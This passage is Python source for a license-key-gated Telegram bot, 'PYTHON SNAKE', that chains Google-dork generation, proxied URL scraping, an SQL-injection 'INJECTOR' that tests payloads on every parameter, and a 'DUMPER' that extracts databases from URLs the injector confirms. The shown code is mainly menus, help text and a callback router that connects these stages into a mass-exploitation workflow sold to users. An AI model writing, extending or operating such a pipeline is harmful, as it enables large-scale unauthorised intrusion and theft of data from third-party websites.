            "Aapki ID: <code>%s</code>\n\n"
            "<b>How to redeem a key</b>\n"
            "1️⃣ Press 🔑 <b>REDEEM KEY</b> below\n"
            "2️⃣ Send the key: <code>SNK-AB12-CD34</code>\n\n"
            "⚡ <b>Or directly:</b> <code>/redeem SNK-AB12-CD34</code>\n"
            "⚡ <b>Or just</b> paste the key in chat — it redeems itself.\n\n"
            "No key? Get one from the owner: %s"
            % (uid, ADMIN_USERNAME))


def kb_needkey() -> InlineKeyboardMarkup:
    return RK([
        [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="m:redeem")],
        [InlineKeyboardButton("☎️ CONTACT OWNER", url="https://t.me/%s" % ADMIN_USERNAME.lstrip("@"))],
    ])


async def show_home(update, uid, edit: bool = True):
    touch_user(update) if update.effective_user else None
    txt = main_text(getattr(update.effective_user, "first_name", "") or "",
                    context=getattr(show_home, "_ctx", None) or _HOME_CTX.get("c"))
    if not access_ok(uid):
        try:
            if edit and update.callback_query:
                await update.callback_query.edit_message_text(need_key_text(uid),
                                                              reply_markup=kb_needkey())
            else:
                await update.effective_message.reply_text(need_key_text(uid),
                                                          reply_markup=kb_needkey())
        except Exception:
            pass
        return
    try:
        if edit and update.callback_query:
            await update.callback_query.edit_message_text(txt, reply_markup=kb_main(uid),
                                                          parse_mode=ParseMode.HTML)
        else:
            await update.effective_message.reply_text(txt, reply_markup=kb_main(uid),
                                                      parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
#  COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    touch_user(update)
    if not is_verified(context, u.id):
        q, kb = captcha_new(context)
        await update.effective_message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
        return
    # /start SNK-XXXX-XXXX  (deep link)
    arg = (" ".join(getattr(context, "args", []) or [])).strip().upper()
    if arg and (KEY_RE.match(arg) or arg in KEYS) and not access_ok(u.id):
        return await input_redeem(update, context, arg)
    await show_home(update, u.id, edit=False)


async def cmd_myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    uid = u.id
    adm = "👑 Admin (unlimited)" if is_admin(uid) else (
        "✅ Licensed" if has_access(uid) else "⚪ No license — 🔑 REDEEM KEY dabao")
    txt = ("🪪 <b>%s</b>\n" % F("YOUR ID", T()["head"]) + T()["div"] + "\n"
           "ID       : <code>%d</code>\n"
           "Username : %s\n"
           "Status   : %s" % (uid, esc("@" + u.username if u.username else (u.first_name or "—")), adm))
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML)


def help_kb() -> InlineKeyboardMarkup:
    tut = str(SETTINGS.get("tutorial") or "").strip()
    rows = []
    if tut.startswith("http"):
        rows.append([InlineKeyboardButton("🎬 HOW TO USE (VIDEO)", url=tut)])
    else:
        rows.append([InlineKeyboardButton("🎬 HOW TO USE (video jald)", callback_data="m:help_noTut")])
    rows.append([InlineKeyboardButton("🔑 REDEEM KEY", callback_data="m:redeem")])
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
    return RK(rows)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(help_text(), parse_mode=ParseMode.HTML,
                                              reply_markup=help_kb())


def help_text() -> str:
    th = T()
    items = [
        ("🔍", "PARSER", "give dorks, get REAL URLs from 7 search engines. Rotating proxy + strict match."),
        ("🎯", "DORKER", "page / ext / param / inurl / site / niche / mixed — up to 100k, with FRESH mode."),
        ("🔑", "HQ KEYWORDS", "give seeds or your own keywords → set a count (max 100k) → scored HQ list."),
        ("🔗", "URL REVERSE", "paste a URL → domain, path, extension, parameters + its dorks."),
        ("💉", "INJECTOR", "%s payloads in %d categories × every parameter, %s DBMS error patterns (%d databases)."
         % (fmt(len(PAYLOADS)), len(PAYLOAD_CATS), fmt(DBMS_COUNT), len(DBMS_ERRORS))),
        ("📦", "DUMPER", "every file you have made — txt / json / zip, plus a full export with no row caps."),
        ("📊", "QUALITY", "0-100 score for dorks and keywords, with the reasons."),
        ("🎲", "RANDOMIZER", "shuffles dorks + mutates operators."),
    ]
    body = []
    for emoji, name, desc in items:
        body.append("%s <b>%s</b>\n   %s" % (emoji, style(name, "btn"), P(desc)))
    return (H("HELP", "what each tool does") + "\n\n"
            + ("\n\n".join(body)) + "\n\n"
            + tag("FILE UPLOAD") + "\n"
            + "Send any .txt (dorks / URLs / keywords) — the bot detects the type by itself "
              "and offers Deep Scan, Reverse, Clean and Quality Check.\n\n"
            + tag("FRESH SYSTEM") + "\n"
            + "DORKER has 🆕 <b>FRESH DORKS</b> — dorks you already generated are skipped, "
              "so every run gives new dorks and new URLs. <code>/fresh</code> shows status, "
              "<code>/fresh clear</code> resets it.\n\n"
            + tag("THEME") + "\n"
            + "Admin can change font + divider + icon with <code>/theme</code> "
              "(%d themes).\n\n" % len(THEMES)
            + tag("ENGINES") + "\n"
            + "Slow on a phone? Use <code>/engines fast</code> — "
              "only 3 engines (Bing • Mojeek • DDG Lite — no proxy needed).\n"
              "Normal = 5, Max = all 7. You can also switch from the 🎛 button on the PARSER screen.\n\n"
            + tag("FILE FORMATS") + "\n"
            + "txt • csv • tsv • json • log • html • xlsx • docx • pptx • zip • gz — "
              "works even without an extension. Whatever flow is open (GEN/PRO/KW/PARSER), "
              "the file goes straight into it.\n\n"
            + tag("SERP APIs") + "\n"
            + "Free + paid API list (rate, limit, where to get it): <code>/apis</code>\n"
            + "Add your own key: <code>/setkey serper KEY</code>\n\n"
            + "%s <b>%s</b> — admin panel only." % (th["icon"], style("ADMIN", "btn")))


# ═══════════════════════════════════════════════════════════════════════════════
#  CALLBACK ROUTER
# ═══════════════════════════════════════════════════════════════════════════════
# ── HTML-safe Telegram calls (patch ek baar, poore bot pe lagu) ────────────
TAG_RX = re.compile(r"</?(?:b|strong|i|em|u|ins|s|strike|del|code|pre|a|span|"
                    r"blockquote|tg-spoiler)(?:\s[^>]*)?>", re.I)


def html_plain(text) -> str:
    """HTML tags hata ke plain text — Telegram reject karne par fallback."""
    t = TAG_RX.sub("", str(text or ""))
    return _html.unescape(t)


def _is_premium_error(exc) -> bool:
    """Telegram ne custom emoji reject kiya? (Premium/Fragment nahi hai)."""
    msg = str(exc).lower()
    return any(k in msg for k in ("custom emoji", "premium", "fragment", "emoji-id",
                                  "customemoji"))


def _is_parse_error(exc) -> bool:
    msg = str(exc).lower()
    return any(k in msg for k in ("parse entities", "can't parse", "unsupported start tag",
                                  "unclosed", "can't find end", "entity", "too long"))


def _patch_telegram_safe():
    """edit_text / reply_text ko safe banao — failure ab kabhi silent nahi."""
    if getattr(Message, "_snake_safe", False):
        return
    orig_edit, orig_reply = Message.edit_text, Message.reply_text

    async def edit_text(self, text=None, **kw):
        try:
            return await orig_edit(self, text, **kw)
        except Exception as exc:
            name = type(exc).__name__
            if "MessageNotModified" in name:
                return self
            logger.warning("edit_text fail (%s): %s", name, str(exc)[:140])
            if _is_premium_error(exc) and EMOJI_OK[0]:
                EMOJI_OK[0] = False
                logger.warning("🎨 Premium emoji not allowed — normal emoji pe switch")
                try:
                    return await orig_edit(self, strip_premium(text), **kw)
                except Exception:
                    pass
            kw.pop("parse_mode", None)
            try:
                return await orig_edit(self, html_plain(text), **kw)
            except Exception:
                raise exc

    async def reply_text(self, text=None, **kw):
        try:
            return await orig_reply(self, text, **kw)
        except Exception as exc:
            name = type(exc).__name__
            logger.warning("reply_text fail (%s): %s", name, str(exc)[:140])
            if _is_premium_error(exc) and EMOJI_OK[0]:
                EMOJI_OK[0] = False
                logger.warning("🎨 Premium emoji not allowed — normal emoji pe switch")
                try:
                    return await orig_reply(self, strip_premium(text), **kw)
                except Exception:
                    pass
            kw.pop("parse_mode", None)
            return await orig_reply(self, html_plain(text), **kw)

    # button-driven screens (q.edit_message_text) bhi isi tarah safe
    orig_qedit = CallbackQuery.edit_message_text

    async def q_edit(self, text=None, **kw):
        try:
            return await orig_qedit(self, text, **kw)
        except Exception as exc:
            if "MessageNotModified" in type(exc).__name__:
                return self.message
            logger.warning("query edit fail (%s): %s", type(exc).__name__, str(exc)[:140])
            if _is_premium_error(exc) and EMOJI_OK[0]:
                EMOJI_OK[0] = False
                logger.warning("🎨 Premium emoji not allowed — normal emoji pe switch")
                try:
                    return await orig_qedit(self, strip_premium(text), **kw)
                except Exception:
                    pass
            kw.pop("parse_mode", None)
            try:
                return await orig_qedit(self, html_plain(text), **kw)
            except Exception:
                raise exc

    CallbackQuery.edit_message_text = q_edit
    Message.edit_text, Message.reply_text = edit_text, reply_text
    Message._snake_safe = True
    globals()["SILENT_GUARD"] = True


try:                              # hamesha ON — bot start hone se pehle hi
    _patch_telegram_safe()
except Exception as _exc:
    logger.warning("telegram safe patch skip: %s", _exc)


async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Har button — koi bhi exception ho, user ko hamesha jawab milta hai."""
    try:
        return await _on_callback_inner(update, context)
    except Exception as exc:
        logger.exception("callback %s fail: %s", getattr(update.callback_query, "data", "?"), exc)
        try:
            await update.callback_query.answer("⚠️ Something went wrong — see the message below",
                                               show_alert=False)
        except Exception:
            pass
        try:
            await update.callback_query.edit_message_text(
                (H("OOPS", "button error") + "\n\n"
                 + "<code>%s</code>\n\n" % esc(str(exc)[:240])
                 + P("Menu is fine — pick another step. If this repeats, /ping and send "
                     "me that line.")),
                parse_mode=ParseMode.HTML,
                reply_markup=RK([[InlineKeyboardButton("🏠 MENU", callback_data="m:home")]]))
        except Exception:
            try:
                await reply_msg(update).reply_text(
                    "⚠️ Error: %s" % str(exc)[:200],
                    reply_markup=RK([[InlineKeyboardButton("🏠 MENU", callback_data="m:home")]]))
            except Exception:
                pass
        return


async def _on_callback_inner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = update.effective_user.id
    data = q.data or ""
    # instant feedback — user ko pata rahe ki tap register hua
    if not data.startswith(("sp:", "cap:", "noop")):
        try:
            await q.answer("…")
        except Exception:
            pass
    # ⚠️ naya button = naya intent — purana adhoora input cancel
    old_wait = await_get(context)
    if old_wait and not data.startswith("cap:"):
        await_clear(context)

    # ── feature gate (admin ne band kiya ho to custom message) ──
    if not is_admin(uid):
        gate = feat_gate(data)
        if gate:
            try:
                await q.answer("This feature is under maintenance", show_alert=False)
            except Exception:
                pass
            try:
                await q.edit_message_text(feat_msg(gate), parse_mode=ParseMode.HTML,
                                          reply_markup=kb_back("m:home"))
            except Exception:
                pass
            return

    # ── captcha ──
    if data.startswith("cap:"):
        val = data.split(":", 1)[1]
        if val == "new":
            text, kb = captcha_new(context)
            try:
                await q.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        try:
            ok = int(val) == int(context.user_data.get("cap", -999))
        except Exception:
            ok = False
        if ok:
            context.user_data["verified"] = True
            try:
                USERS.setdefault(str(uid), {})["verified"] = True
                save_all()
            except Exception:
                pass
            await show_home(update, uid)
        else:
            text, kb = captcha_new(context)
            try:
                await q.edit_message_text("❌ Wrong! Try again.\n\n" + text,
                                          reply_markup=kb, parse_mode=ParseMode.HTML)
            except Exception:
                pass
        return

    # ── niche actions ──
    if data.startswith("nc:"):
        if not access_ok(uid):
            try:
                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                          parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        return await cb_custom_niche(update, context, data[3:])

    # ── STOP button ──
    if data.startswith("sp:"):
        parts = data.split(":")
        t_uid = parts[1] if len(parts) > 1 else ""
        d = STOP_FLAGS.get(t_uid)
        if d and (str(uid) == str(t_uid) or is_admin(uid)):
            d["stop"] = True
            try:
                await q.answer("⛔ Stopping…", show_alert=False)
            except Exception:
                pass
            try:
                await q.edit_message_reply_markup(
                    reply_markup=RK([[InlineKeyboardButton("⛔ STOPPING…", callback_data="noop")]]))
            except Exception:
                pass
        else:
            try:
                await q.answer("Stale button — nothing is running", show_alert=True)
            except Exception:
                pass
        return

    # ── file actions ──
    if data.startswith("f:"):
        if not access_ok(uid):
            try:
                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                          parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        try:
            return await cb_file(update, context, data[2:])
        except Exception as exc:
            logger.exception("file action %s fail: %s", data, exc)
            try:
                await q.edit_message_text("❌ Error: <code>%s</code>" % esc(str(exc)[:200]),
                                          parse_mode=ParseMode.HTML, reply_markup=kb_back())
            except Exception:
                pass
            return

    # ── quality checker ──
    if data.startswith("qa:"):
        if not access_ok(uid):
            try:
                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                          parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        try:
            return await cb_qa_type(update, context, data[3:])
        except Exception as exc:
            logger.exception("qa %s fail: %s", data, exc)
            return

    # ── keyword actions ──
    if data.startswith("kw:"):
        if not access_ok(uid):
            try:
                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                          parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        try:
            return await cb_kw_action(update, context, data[3:])
        except Exception as exc:
            logger.exception("kw action %s fail: %s", data, exc)
            try:
                await q.edit_message_text("❌ Error: <code>%s</code>" % esc(str(exc)[:200]),
                                          parse_mode=ParseMode.HTML, reply_markup=kb_back())
            except Exception:
                pass
            return

    # ── theme ──
    if data.startswith("th:set:"):
        return await cb_theme_set(update, context, data[7:])

    # ── URL reverse modes ──
    if data.startswith("rv:"):
        return await cb_rev_mode(update, context, data[3:])

    # ── premium emoji slot pick (admin) ──
    if data.startswith("se:set:"):
        if not is_admin(uid):
            return await show_home(update, uid)
        return await cb_premium_pick(update, context, data[7:])

    # ── admin ──
    if data.startswith("a:"):
        return await admin_callback(update, context, data[2:])

    # ── proxy sirf admin — user panel me kuch bhi na dikhe ──
    if data.startswith(("px:", "m:proxy")) and not is_admin(uid):
        return await show_home(update, uid)

    # ── tool sub-buttons (dd / pr / rd / df / px / inj) ──
    if data.startswith(("dd:", "dp:", "pr:", "rd:", "df:", "px:", "inj:", "dk:")):
        if not access_ok(uid):
            try:
                await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                          parse_mode=ParseMode.HTML)
            except Exception:
                pass
            return
        try:
            return await _route_tool_cb(update, context, data)
        except Exception as exc:
            logger.exception("tool-cb %s fail: %s", data, exc)
            try:
                await q.edit_message_text("❌ Error: <code>%s</code>" % esc(str(exc)[:200]),
                                          parse_mode=ParseMode.HTML, reply_markup=kb_back())
            except Exception:
                pass
            return

    # ── menu ──
    if not data.startswith("m:"):
        return
    tool = data[2:]
    if tool == "home":
        return await show_home(update, uid)

    # 🔑 redeem aur help bina key wale ko bhi milna chahiye
    if tool in ("redeem", "help"):
        if tool == "redeem":
            try:
                await q.edit_message_text(tool_redeem_text(), reply_markup=kb_back("m:home"),
                                          parse_mode=ParseMode.HTML)
            except Exception:
                pass
            await_set(context, "key_redeem")
            return
        try:
            await q.edit_message_text(help_text(), reply_markup=help_kb(),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    if not access_ok(uid):
        try:
            await q.edit_message_text(need_key_text(uid), reply_markup=kb_needkey(),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    if tool == "help":
        try:
            await q.edit_message_text(help_text(), reply_markup=kb_back("m:home"),
                                      parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    if tool == "help_noTut":
        try:
            await q.answer("🎬 Video tutorial is coming soon — the text help above has "
                           "every step.", show_alert=True)
        except Exception:
            pass
        return

    if tool == "qual_done":
        return

    handler = TOOL_HANDLERS.get(tool)
    if handler:
        try:
            await handler(update, context)
        except Exception as exc:
            logger.exception("tool %s fail: %s", tool, exc)
            try:
                await q.edit_message_text("❌ Error: <code>%s</code>" % esc(str(exc)[:200]),
                                          parse_mode=ParseMode.HTML, reply_markup=kb_back())
            except Exception:
                pass


async def _route_tool_cb(update, context, data: str):
    """dd: pr: rd: df: px: inj: — in sab ka dispatcher."""
    head, _, rest = data.partition(":")
    if head == "dd":
        if rest.startswith("mode:"):
            return await cb_dork_mode(update, context, rest[5:])
        if rest == "more":
            return await cb_dork_more(update, context)
        if rest == "gen":
            return await cb_gen_start(update, context)
        if rest == "pro":
            return await cb_pro_menu(update, context)
    elif head == "dk":
        if rest.startswith("cms:"):
            return await cb_dk_cms(update, context, rest[4:])
        if rest == "cms":
            return await cb_dk_cms(update, context)
        if rest == "exp":
            return await cb_dk_exp(update, context)
    elif head == "dp":
        if rest.startswith("set:"):
            return await cb_pro_set(update, context, rest[4:])
        if rest == "country":
            return await cb_country(update, context)
        if rest.startswith("ctry:"):
            return await cb_country(update, context, rest[5:])
        if rest.startswith("tplall:"):
            return await cb_pro_tpl(update, context, rest)
        if rest.startswith("tpl:"):
            return await cb_pro_tpl(update, context, rest)
        if rest == "tpl":
            return await cb_pro_tpl(update, context, "")
        if rest == "cfg":
            return await cb_pro_cfg(update, context)
        if rest.startswith("reset"):
            return await cb_pro_reset(update, context, rest.split(":", 1)[1] if ":" in rest else "")
        if rest.startswith("combo"):
            return await cb_pro_combos(update, context, rest.split(":", 1)[1] if ":" in rest else "")
        if rest == "combos":
            return await cb_pro_combos(update, context, "")
        if rest == "gen":
            return await cb_pro_gen(update, context)
    elif head == "pr":
        if rest == "last":
            return await cb_parse_last(update, context)
        if rest == "manual":
            return await cb_parse_manual(update, context)
        if rest == "deep":
            return await cb_parse_deep(update, context)
        if rest == "eng":
            return await cb_parse_engine(update, context)
        if rest == "cfg":
            return await cb_parse_cfg(update, context, "")
        if rest.startswith("set:"):
            return await cb_parse_cfg(update, context, rest[4:])
        if rest == "limit":
            return await cb_parse_limit(update, context)
        if rest == "rest":
            rest_d = context.user_data.get("parse_rest") or []
            if not rest_d:
                try:
                    await update.callback_query.answer("Kuch bacha nahi — sab scan ho gaya",
                                                       show_alert=True)
                except Exception:
                    pass
                return
            return await launch_deep(update, context, rest_d)
        if rest == "paste":
            dorks = context.user_data.get("paste_dorks") or []
            if not dorks:
                try:
                    await update.callback_query.answer("Send the dorks again", show_alert=True)
                except Exception:
                    pass
                return
            return await launch_deep(update, context, dorks)
        if rest == "crawl":
            return await cb_deep_crawl(update, context,
                                       context.user_data.get("last_urls") or [])
    elif head == "rd":
        if rest == "last":
            return await cb_rand_last(update, context)
        if rest == "manual":
            return await cb_rand_manual(update, context)
    elif head == "df":
        if rest == "go":
            return await cb_dump_go(update, context)
        if rest == "old":
            return await cb_dump_old(update, context)
        if rest == "harv":
            return await cb_dump_harv(update, context)
        if rest == "frominj":
            targets = dict(context.user_data.get("inj_confirmed") or {})
            urls = list(targets.keys())
            if not urls:
                try:
                    await update.callback_query.answer(
                        "Pehle INJECTOR chalao — confirmed URLs chahiye", show_alert=True)
                except Exception:
                    pass
                return
            return await _run_sqldump(update, context, urls, targets=targets)
        if rest == "paste":
            urls = context.user_data.get("paste_urls") or []
            if not urls:
                try:
                    await update.callback_query.answer("Send the URLs again", show_alert=True)
                except Exception:
                    pass
                return
            return await _run_sqldump(update, context, urls)
        if rest == "hpaste":
            urls = context.user_data.get("paste_urls") or []
            if not urls:
                try:
                    await update.callback_query.answer("Send the URLs again", show_alert=True)
                except Exception:
                    pass
                return
            return await _run_dump(update, context, urls)
        if rest in ("last", "vuln"):
            return await cb_dump_use(update, context, rest)
        return await cb_dump_file(update, context)
    elif head == "px":
        if rest == "run":
            return await cb_proxy_run(update, context)
        if rest == "stat":
            return await cb_proxy_stat(update, context)
        if rest == "clear":
            return await cb_proxy_clear(update, context)
    elif head == "inj":
        if rest == "go":
            return await cb_inj_go(update, context)
        if rest == "paste":
            urls = context.user_data.get("paste_urls") or []
            if not urls:
                try:
                    await update.callback_query.answer("Send the URLs again", show_alert=True)
                except Exception:
                    pass
                return
            return await _run_inject(update, context, urls)
        if rest == "last":
            return await cb_inj_last(update, context)
        if rest.startswith("cat:"):
            return await cb_inj_cat(update, context, rest[4:])
    logger.warning("unknown tool callback: %s", data)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: DORKER
# ═══════════════════════════════════════════════════════════════════════════════
DORK_MODES = {
    "page":  ("📄 PAGE-TYPES", "inurl:product.php, shop/item.php …"),
    "ext":   ("🗂 EXTENSIONS", "filetype:php, filetype:sql …"),
    "param": ("🔧 PARAMETERS", "inurl:id=, inurl:page= …"),
    "inurl": ("🔗 INURL", "inurl:, allinurl:, inurl:?id= …"),
    "site":  ("🌐 SITE", "site:gov.in inurl:login …"),
    "niche": ("🎯 NICHE", "niche ke hisaab se"),
    "mixed": ("🎲 MIXED (HQ)", "saare templates random"),
}


def L(t) -> str:
    """Body label — theme font (emoji safe)."""
    return style(str(t), "sub")


def B(label) -> str:
    """Body LABEL — heading font (bold look, emoji safe)."""
    return style(str(label), "head")


def P(prose) -> str:
    """Prose line — subtitle/italic font (emoji safe)."""
    return style(str(prose), "sub")


def KV(label, value, emoji: str = "") -> str:
    """Themed 'label : value' line — label stylish, value plain."""
    head = ("%s " % emoji if emoji else "") + B(label)
    return "%s : %s" % (head, value)


def _demo(lst, n=6) -> str:
    return " ".join(str(x) for x in (lst or [])[:n])


# ── DORKER — main (2 options) ────────────────────────────────────────────────
async def tool_dork(update, context):
    q = update.callback_query
    txt = (H("DORKER", "dono tarike", slot="dork") + "\n\n"
           "⚡ <b>%s</b>\n   %s\n\n"
           "🚀 <b>%s</b>\n   %s\n\n"
           "%s\n\n"
           "%s"
           % (B("DORKS GEN"), P("Count → Keywords → ready dorks"),
              B("DORKS GEN PRO"), P("Domains · Params · Filetypes · Templates · Combos"),
              KV("History", "<code>%s</code> dorks" % fmt(dork_seen_count()), "📚"),
              P(VERSION)))
    try:
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=RK([
            [InlineKeyboardButton("⚡ DORKS GEN", callback_data="dd:gen")],
            [InlineKeyboardButton("🚀 DORKS GEN PRO", callback_data="dd:pro")],
            [InlineKeyboardButton("🏗 CMS DORKS", callback_data="dk:cms"),
             InlineKeyboardButton("📂 EXPOSED FILES", callback_data="dk:exp")],
            [InlineKeyboardButton("🌍 COUNTRY DORKS", callback_data="dp:country")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
        ]))
    except Exception:
        pass


# ── NORMAL GEN ───────────────────────────────────────────────────────────────
async def cb_gen_start(update, context):
    q = update.callback_query
    context.user_data.pop("gen_count", None)
    try:
        await q.edit_message_text(
            (H("DORKS GEN", "step 1 / 2") + "\n\n"
             "🔢 %s\n\n"
             "<b>%s</b>\n\n"
             "%s"
             % (B("Send the count"), P("Number hi likho — jaise 1000"),
                KV("Range", "1 – %s" % fmt(DORK_MAX)),
                ) + "\n" + KV("Recommended", "1,000")),
            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dork"))
    except Exception:
        pass
    await_set(context, "gen_count")


async def input_gen_count(update, context, text: str):
    pf = _take_pending(context, "gen_count", "dork_count")
    try:
        n = int(re.sub(r"[^0-9]", "", text or "") or "1000")
    except Exception:
        n = 1000
    n = max(1, min(DORK_MAX, n))
    context.user_data["gen_count"] = n
    await update.effective_message.reply_text(
        (H("DORKS GEN", "step 2 / 2") + "\n\n"
         "%s\n\n"
         "🔑 <b>%s</b>\n\n"
         "%s\n\n"
         "<code>shopify store, crypto wallet, admin panel</code>\n\n"
         "%s"
         % (KV("Count", "<code>%s</code>" % fmt(n), "✅"),
            B("Now Send Keywords"),
            P("Separate with commas or lines — or just send a FILE (.txt/.csv/.json/.xlsx)"),
            P("Universal HQ templates run on every keyword"))),
        parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dork"))
    await_set(context, "gen_kw")
    if pf:                                  # file pehle bheji thi → seedha gen
        await update.effective_message.reply_text(
            "📂 Took <b>%d keywords</b> from the file you sent — building dorks…"
            % len(pf), parse_mode=ParseMode.HTML)
        return await input_gen_kw(update, context, "\n".join(pf))


async def input_gen_kw(update, context, text: str):
    n = int(context.user_data.get("gen_count") or 1000)
    ok, err = kind_check(text, "keywords", "keywords")
    if not ok:
        await update.effective_message.reply_text(err, parse_mode=ParseMode.HTML,
                                                  reply_markup=kb_back("m:dork"))
        await_set(context, "gen_kw")
        return
    msg = await update.effective_message.reply_text("⚡ Building %s dorks…" % fmt(n))
    t0 = time.time()
    dorks = universal_gen(text, n=n)
    took = time.time() - t0
    if not dorks:
        await msg.edit_text("❌ Nothing generated — check your keywords.")
        return
    context.user_data["last_dorks"] = dorks
    context.user_data["gen_kw_text"] = text
    added = dork_seen_add(dorks)
    sc = [score_dork(d)[0] for d in dorks]
    avg = sum(sc) / len(sc)
    path, cnt = dump_text(dorks, "gen", "PYTHON SNAKE — universal dorks")
    try:
        await msg.delete()
    except Exception:
        pass
    await update.effective_message.reply_text(
        (H("DORKS GEN — DONE", "%s dorks" % fmt(cnt)) + "\n\n"
         "%s\n%s\n%s\n%s\n%s\n%s\n\n"
         "<b>%s</b>\n%s"
         % (KV("Keywords", "<code>%d</code>" % len(kw_cores(text)), "🔑"),
            KV("Gap fix", "<code>%d</code> multi-word → inurl me hyphen, intitle me quote"
               % sum(1 for _k in kw_cores(text) if " " in _k), "🧹"),
            KV("Built", "<code>%s</code>" % fmt(cnt), "✅"),
            KV("New", "<code>%s</code>" % fmt(added), "🆕"),
            KV("Avg score", "<code>%.0f/100</code>" % avg, "⭐"),
            KV("Time", "<code>%.2fs</code>" % took, "⏱"),
            B("Top 8"), short_list(dorks[:8], 8))),
        parse_mode=ParseMode.HTML, reply_markup=RK([
            [InlineKeyboardButton("🚀 DEEP SCAN", callback_data="pr:deep")],
            [InlineKeyboardButton("🆕 MORE (fresh)", callback_data="dd:more")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="m:dork")],
        ]))
    await send_file(update, path, "⚡ %s dorks • avg %.0f/100" % (fmt(cnt), avg))
    await_clear(context)


# ── legacy mode buttons (purane messages ke liye) ───────────────────────────
async def cb_dork_mode(update, context, mode: str):
    return await cb_gen_start(update, context)


async def input_dork_count(update, context, text: str):
    return await input_gen_count(update, context, text)


NICHE_TXT = ("➕ <b>ADD NICHE — step 1 / 2</b>\n\n"
             "Now send the <b>keywords</b> for this niche.\n"
             "<i>Separate with commas or lines — or send a .txt/.csv file</i>\n\n"
             "example: <code>shopify store, crypto wallet, admin panel</code>")


async def cb_custom_niche(update, context, arg: str = ""):
    """➕ ADD NICHE / 📁 use / 🗑 delete."""
    q = update.callback_query
    arg = (arg or "").strip()
    if arg == "add":
        context.user_data["niche_stage"] = "kw"
        context.user_data.pop("niche_kw", None)
        try:
            await q.edit_message_text(NICHE_TXT, parse_mode=ParseMode.HTML,
                                      reply_markup=kb_back("m:home"))
        except Exception:
            pass
        await_set(context, "nc_kw")
        return
    if arg.startswith("use:"):
        name = niche_by_index(arg[4:])
        if not name:
            try:
                await q.answer("Niche not found", show_alert=True)
            except Exception:
                pass
            return
        kws = niche_get(name)
        if not kws:
            try:
                await q.answer("This niche has no keywords", show_alert=True)
            except Exception:
                pass
            return
        context.user_data["last_kw_items"] = kws
        context.user_data["gen_kw_text"] = "\n".join(kws)
        try:
            await q.answer("Niche: %s" % name)
        except Exception:
            pass
        return await niche_menu(update, context, name)
    if arg.startswith("del:"):
        name = niche_by_index(arg[4:])
        niche_del(name)
        try:
            await q.answer("🗑 %s deleted" % name)
        except Exception:
            pass
        return await show_home(update, update.effective_user.id)
    if arg.startswith("dork:"):        # niche se dorks banao
        name = niche_by_index(arg[5:])
        kws = niche_get(name)
        if not kws:
            return
        msg = await reply_msg(update).reply_text("⚡ %s → building dorks…" % name)
        dorks = universal_gen("\n".join(kws), n=int(sget("niche_dorks", 2000) or 2000))
        context.user_data["last_dorks"] = dorks
        context.user_data["gen_kw_text"] = "\n".join(kws)
        dork_seen_add(dorks)
        path, cnt = dump_text(dorks, "niche_" + kw_slug(name), "PYTHON SNAKE — %s" % name)
        try:
            await msg.edit_text(
                (H("NICHE DORKS", "%s • %s" % (name, fmt(cnt))) + "\n\n"
                 + KV("Keywords", "<code>%s</code>" % fmt(len(kws)), "🔑") + "\n"
                 + KV("Dorks", "<code>%s</code>" % fmt(cnt), "🎯") + "\n\n"
                 + B("Top 6") + "\n" + short_list(dorks[:6], 6)),
                parse_mode=ParseMode.HTML,
                reply_markup=RK([[InlineKeyboardButton("🔍 DEEP SCAN", callback_data="pr:deep")],
                                 [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")]]))
        except Exception:
            pass
        await send_file(update, path, "🎯 %s %s dorks" % (fmt(cnt), name))
        return


async def niche_menu(update, context, name: str):
    kws = niche_get(name)
    q = update.callback_query
    idx = niche_list().index(name) if name in niche_list() else 0
    kb = RK([
        [InlineKeyboardButton("🎯 MAKE DORKS (%s)" % fmt(int(sget("niche_dorks", 2000) or 2000)),
                              callback_data="nc:dork:%d" % idx)],
        [InlineKeyboardButton("🔍 DEEP SCAN", callback_data="pr:deep")],
        [InlineKeyboardButton("🗑 DELETE", callback_data="nc:del:%d" % idx)],
        [InlineKeyboardButton("⬅️ MY NICHES", callback_data="kw:niche"),
         InlineKeyboardButton("🏠 HOME", callback_data="m:home")],
    ])
    txt = (H("NICHE", name) + "\n\n"
           + KV("Keywords", "<code>%s</code>" % fmt(len(kws)), "🔑") + "\n"
           + KV("Created", "<code>%s</code>" % esc((niche_all().get(name) or {}).get("ts", "—")), "🕒")
           + "\n\n" + B("Sample") + "\n" + short_list(kws[:6], 6))
    try:
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
    except Exception:
        try:
            await reply_msg(update).reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass


